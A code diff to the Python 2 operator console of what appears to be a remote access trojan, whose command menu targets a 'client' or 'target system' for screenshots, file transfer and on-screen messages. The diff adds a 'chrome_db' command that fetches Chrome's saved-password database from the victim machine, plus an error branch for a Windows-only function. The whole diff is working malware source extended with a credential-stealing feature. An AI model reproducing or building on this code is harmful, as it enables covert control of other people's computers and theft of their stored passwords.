@@ -93,6 +93,11 @@ def download(command):
         if l.startswith("File not found"):
             print Fore.RED + "[!] File not found\n"
             menu()
+
+        elif l == "[!] This func, works only on Windows!\n":
+            print bright + red + l
+            menu()
+
         else:
 	        f = open(fileName, 'wb')
 	        while (l):
@@ -116,6 +121,7 @@ def help():
 Commands:
     help()                  : Show this message.
     screenshot()            : Take a screenshot on client and send image file to server.
+    chrome_db               : Download Chrome's password database.
     download                : Download files from client.
     upload                  : Upload files to client from server.
     message TEXT            : Show messages on target system.
@@ -168,6 +174,9 @@ def menu():
 
         elif "download" in command:
             download(command)
+
+        elif command == "chrome_db":
+            download("download chrome_db")
 
         elif command == "": 
             command = " "
